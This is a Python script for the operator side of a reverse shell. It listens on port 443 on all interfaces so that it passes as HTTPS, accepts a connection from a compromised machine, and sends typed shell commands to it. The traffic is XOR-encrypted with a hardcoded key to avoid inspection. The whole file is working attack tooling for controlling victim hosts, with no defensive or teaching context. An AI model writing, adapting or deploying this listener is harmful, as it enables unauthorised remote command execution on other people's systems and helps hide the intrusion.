import socket
import threading

# XOR encryption key
KEY = b'secretkey'

def xor_encrypt(data):
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def handle_client(client_socket):
    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            client_socket.send(xor_encrypt(command.encode()))
            break
        else:
            client_socket.send(xor_encrypt(command.encode()))
            response = client_socket.recv(4096)
            print(xor_encrypt(response).decode())

def main():
    server = socket.socket()
    server.bind(("0.0.0.0", 443))  # Listen on all interfaces on port 443
    server.listen(5)
    print("[*] Listening for incoming connections...")
    client_socket, addr = server.accept()
    print(f"[*] Connection established from {addr[0]}")
    handle_client(client_socket)

if __name__ == "__main__":
    main()
